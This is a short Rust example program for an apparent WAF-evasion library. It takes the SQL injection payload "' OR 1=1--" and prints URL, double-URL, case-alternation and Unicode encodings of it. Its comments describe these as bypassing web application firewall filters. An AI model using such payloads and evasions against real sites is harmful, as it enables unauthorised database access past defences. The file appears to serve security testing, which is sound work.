//! Simple encoding example — URL-encode a payload to bypass basic WAF filters.

use wafrift_encoding::{Strategy, encode};

fn main() {
    // A classic SQL injection payload that most WAFs will catch
    let payload = "' OR 1=1--";

    println!("Original payload:");
    println!("  {}", payload);
    println!();

    // Single URL encoding: converts special characters to %XX hex escapes
    let encoded = encode(payload, Strategy::UrlEncode).unwrap();

    println!("URL-encoded (bypasses keyword filters):");
    println!("  {}", encoded);
    println!();

    // Show what the server decodes it back to
    println!("Server decodes this back to:");
    println!("  {}", payload);
    println!();

    // Try a few more strategies
    println!("Other encodings for comparison:");

    let double = encode(payload, Strategy::DoubleUrlEncode).unwrap();
    println!("  Double URL:    {}", double);

    let case_alt = encode(payload, Strategy::CaseAlternation).unwrap();
    println!("  Case alt:      {}", case_alt);

    let unicode = encode(payload, Strategy::UnicodeEncode).unwrap();
    println!("  Unicode:       {}", unicode);
}
